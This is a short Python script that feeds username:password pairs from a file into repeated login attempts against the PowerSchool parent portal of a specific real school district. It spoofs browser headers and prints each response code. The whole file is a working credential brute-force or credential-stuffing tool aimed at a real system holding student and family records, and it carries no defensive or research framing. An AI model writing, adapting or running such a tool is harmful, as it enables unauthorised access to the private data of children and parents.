import requests

from bruty import BruteManager

HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "powerschool.d128.org",
    "Origin": "https://powerschool.d128.org",
    "Referer": "https://powerschool.d128.org/public/home.html",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
}

def check(account):
    username, password = account.split(":")
    session = requests.Session()

    d = {
        "pstoken": "",
        "contextData": "",
        "dbpw": password,
        "translator_username": "",
        "translator_password": "",
        "translator_ldappassword": "",
        "returnUrl": "https://powerschool.d128.org/guardian/home.html",
        "serviceName": "PS Parent Portal",
        "serviceTicket": "",
        "pcasServerUrl": "/",
        "credentialType": "User Id and Password Credential",
        "ldappassword": password,
        "account": username,
        "pw": password,
        "translatorpw": ""
    }

    r = session.post(url="https://powerschool.d128.org/guardian/home.html", headers=HEADERS, data=d)
    print(r.status_code)
    
if __name__ == "__main__":
    brute = BruteManager('accounts.txt')
    brute.start(1, check)
    print("done")